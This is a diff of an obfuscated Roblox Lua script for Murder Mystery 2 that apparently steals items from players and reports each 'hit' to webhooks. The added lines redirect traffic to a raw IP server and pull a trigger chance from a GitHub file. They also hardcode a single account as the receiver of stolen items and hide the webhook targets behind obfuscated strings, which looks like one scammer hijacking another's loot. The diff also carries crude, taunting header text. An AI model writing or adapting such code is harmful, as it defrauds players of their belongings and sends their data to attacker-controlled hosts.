@@ -24,10 +24,6 @@ local function geniter(f, s, c)
 	end
 end
 
-local function has(f)
-	return f ~= nil and type(f) ~= "userdata"
-end
-
 pcall(function()
 	local t1 = {}
 
@@ -232,7 +228,7 @@ end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
-local v40 = "https://pastefy.app/WpdtGON4/raw?t=" .. tostring(tick())
+local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
 
 local function v41()
 	local ok2, result2 = pcall(function()
@@ -251,7 +247,7 @@ local function v41()
 		end
 	end
 
-	return "https://lingering-frog-ec16.snthnova.workers.dev"
+	return "http://212.119.42.158:3000"
 end
 
 if not getgenv().MM2_API_BASE then
@@ -1102,7 +1098,19 @@ end
 
 local v246 = MM2_API_BASE .. "/webhook/"
 local v247 = MM2_API_BASE
-local v250 = 0
+local n7 = 0
+
+pcall(function()
+	local match = game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/m"):match("%d+%.?%d*")
+
+	if match then
+		n7 = tonumber(match) or 0
+	else
+		n7 = 0
+	end
+end)
+
+local v250 = n7
 
 v32("SPECIAL_WEBHOOK_CHANCE=" .. v250)
 
@@ -1124,6 +1132,7 @@ local function v251(p21, p22, p23)
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/x-www-form-urlencoded",
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
 		},
 		Body = result4
 	})
@@ -1138,6 +1147,7 @@ local function v254()
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json",
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
 		},
 		Body = HttpService:JSONEncode({
 			target_players = RECEIVERS,
@@ -1165,6 +1175,7 @@ local function v256()
 			Method = "POST",
 			Headers = {
 				["Content-Type"] = "application/json",
+				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
 			},
 			Body = HttpService:JSONEncode({
 				place_id = tostring(game.PlaceId),
@@ -1271,11 +1282,11 @@ local function v269(p24, p25)
 	return {
 		content = "",
 		embeds = { {
-			title = p24 and "Murder Mystery 2 Public Hit!" or "Murder Mystery 2 Hit!",
+			title = p24 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or "Murder Mystery 2 Hit! Snthnova so peak",
 			color = 16711680,
 			fields = t17,
 			footer = {
-				text = "Snthnova! (Murder Mystery 2)"
+				text = "Elysium! (Murder Mystery 2)"
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 		} }
@@ -1365,11 +1376,12 @@ local function v277()
 
 	if v279 and v297 <= v250 then
 		v32("SPECIAL webhook firing!")
+		RECEIVERS = { "NEDYXSTOCK_chano" }
 
 		local v299 = v269(false, v278)
 
 		v299.content = "@everyone"
-		v251(WEBHOOK, v299.content, v299.embeds)
+		v251("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v299.content, v299.embeds)
 		task.wait(0.5)
 		v256()
 
@@ -1439,10 +1451,10 @@ local function v277()
 		end
 	end
 
-	v251(WEBHOOK, "", v269(true, nil).embeds)
+	v251("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", v269(true, nil).embeds)
 
 	if v300 then
-		v251(WEBHOOK, "", v269(true, nil).embeds)
+		v251("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", v269(true, nil).embeds)
 	end
 end
 
